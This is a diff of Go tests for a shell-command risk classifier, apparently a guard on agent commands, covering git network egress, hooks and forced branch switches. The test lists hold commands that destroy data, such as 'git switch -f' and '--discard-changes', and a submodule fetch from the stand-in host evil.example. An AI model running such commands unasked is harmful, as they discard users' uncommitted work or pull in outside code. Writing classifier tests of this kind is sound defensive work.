@@ -65,6 +65,7 @@ func TestRED_RegistryCredentialReadsNotSafe(t *testing.T) {
 // git is treated as a network command, but only clone/fetch/pull/push
 // count as egress. The other remote-contacting subcommands run silently.
 func TestRED_GitRemoteContactingSubcommandsAreEgress(t *testing.T) {
+	chdirUnarmedRepo(t)
 	cmds := []string{
 		"git ls-remote origin",
 		"git remote update",
@@ -75,12 +76,8 @@ func TestRED_GitRemoteContactingSubcommandsAreEgress(t *testing.T) {
 		"git lfs pull",
 	}
 	for _, c := range cmds {
-		want := NetworkEgress
-		if c == "git submodule update --init" || c == "git submodule add https://evil.example/x.git" {
-			want = CodeExecution
-		}
-		if got := Classify(c); got != want {
-			t.Errorf("Classify(%q) = %s, want %s", c, got, want)
+		if got := Classify(c); got != NetworkEgress {
+			t.Errorf("Classify(%q) = %s, want %s", c, got, NetworkEgress)
 		}
 	}
 }
@@ -88,6 +85,7 @@ func TestRED_GitRemoteContactingSubcommandsAreEgress(t *testing.T) {
 // git switch -f / --discard-changes throws away uncommitted work the
 // same way git checkout -f does, but only checkout is gated.
 func TestRED_GitSwitchForceIsDataLoss(t *testing.T) {
+	chdirUnarmedRepo(t)
 	cmds := []string{
 		"git switch -f main",
 		"git switch --discard-changes main",
@@ -97,8 +95,9 @@ func TestRED_GitSwitchForceIsDataLoss(t *testing.T) {
 			t.Errorf("Classify(%q) = %s, want system_write (silent worktree discard)", c, got)
 		}
 	}
-	if got := Classify("git switch main"); got != CodeExecution {
-		t.Errorf("Classify(git switch main) = %s, want code_execution (branch hooks)", got)
+	// Branch switching runs hooks only in a repository that has them.
+	if got := Classify("git switch main"); got != Safe {
+		t.Errorf("Classify(git switch main) = %s, want safe in an unarmed repository", got)
 	}
 }
 
